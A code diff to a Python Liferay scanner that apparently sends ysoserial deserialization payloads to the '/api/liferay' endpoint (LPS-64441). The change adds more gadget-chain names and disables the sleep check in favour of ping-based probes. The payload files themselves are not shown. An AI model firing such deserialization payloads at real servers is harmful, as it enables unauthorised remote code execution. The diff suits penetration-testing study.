@@ -33,8 +33,13 @@ def ping_deserialization(url):
     url_reformat = re.sub('.*://', '', url)
     url_reformat = re.sub('([:/]).*', '', url_reformat)
     target_ip = socket.gethostbyname(url_reformat)
-    list_ping = ["BeanShell1", "CommonsCollections5", "CommonsCollections6", "CommonsCollections7", "Groovy1",
+    list_ping = ["CommonsBeanUtils", "CommonsCollections1", "CommonsCollections2", "CommonsCollections3",
+                 "CommonsCollections4", "Jdk7u21", "Json1", "ROME", "Spring1", "Spring2", "BeanShell1",
+                 "CommonsCollections5", "CommonsCollections6", "CommonsCollections7", "Groovy1",
                  "Hibernate1", "Hibernate2", "JRMPClient", "MozillaRhino1", "MozillaRhino2", "Myfaces1", "Vaadin1"]
+
+    # list_ping = ["BeanShell1", "CommonsCollections5", "CommonsCollections6", "CommonsCollections7", "Groovy1",
+    #              "Hibernate1", "Hibernate2", "JRMPClient", "MozillaRhino1", "MozillaRhino2", "Myfaces1", "Vaadin1"]
     for name in list_ping:
         payload = open('core/payload_ping/{}.bin'.format(name), 'rb')
         time.sleep(1)
@@ -119,7 +124,7 @@ def main(url):
                     '\033[91m' + "[!] Liferay API allow POST request - May have [LPS-64441] Java Serialization "
                                  "Vulnerability")
                 temp_url = url + "////api/liferay"
-                sleep_deserialization(temp_url)
+                # sleep_deserialization(temp_url)
                 ping_deserialization(temp_url)
             # else:
             #     temp_url = url + "////api/spring"
